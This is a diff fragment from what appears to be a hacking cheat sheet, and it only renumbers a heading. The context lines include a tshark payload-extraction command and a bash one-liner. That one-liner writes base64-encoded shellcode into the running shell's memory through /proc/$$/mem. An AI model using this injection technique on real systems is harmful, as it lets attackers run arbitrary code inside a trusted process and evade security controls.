@@ -3930,7 +4144,7 @@ tshark -r udp.pcap -w udp.hex -Y udp -T fields -e udp.payload | tr -d '\n' | xxd
 # xxd: cannot combine '-r -p' like '-rp'
 ```
 
-## 11.5. Execute Shellcode from Bash
+## 10.5. Execute Shellcode from Bash
 
 ```sh
 cd /proc/$$;exec 3>mem;echo "McBQaC8vc2hoL2JpbonjUFOJ4bALzYA=" | base64 -d | dd bs=1 seek=$(($((16#`cat maps | grep /bin/bash | cut -f1 -d- | head -n 1`)) + $((16#300e0))))>&3
